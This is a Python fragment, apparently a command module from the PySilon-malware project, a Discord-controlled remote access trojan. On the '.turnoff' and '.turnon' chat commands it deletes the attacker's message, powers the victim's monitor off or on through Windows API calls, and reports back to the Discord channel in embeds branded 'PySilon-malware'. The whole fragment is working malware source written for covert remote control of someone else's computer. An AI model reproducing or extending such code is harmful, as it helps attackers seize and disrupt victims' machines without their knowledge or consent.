import ctypes

elif message.content == '.turnoff':
    if not turned_off:
        await message.delete()

        user32 = ctypes.windll.user32
        SendMessage = user32.SendMessageW

        WM_SYSCOMMAND = 0x0112
        SC_MONITORPOWER = 0xF170
        MONITOR_OFF = 2

        SendMessage(0xFFFF, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)

        embed = discord.Embed(title="Monitor turned off",description=f'```Monitor turned off. Turn it back on by using .turnon```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        turned_off = True
    
    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .turnon```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)

elif message.content == '.turnon':
    if turned_off:
        await message.delete()

        MONITOR_ON = -1
        SendMessage(0xFFFF, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON) 

        embed = discord.Embed(title="🟢 Monitor turned on",description=f'```Monitor has been turned on. Turn it off by using .turnoff```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        turned_off = False
    else: 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .turnoff```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)   
        
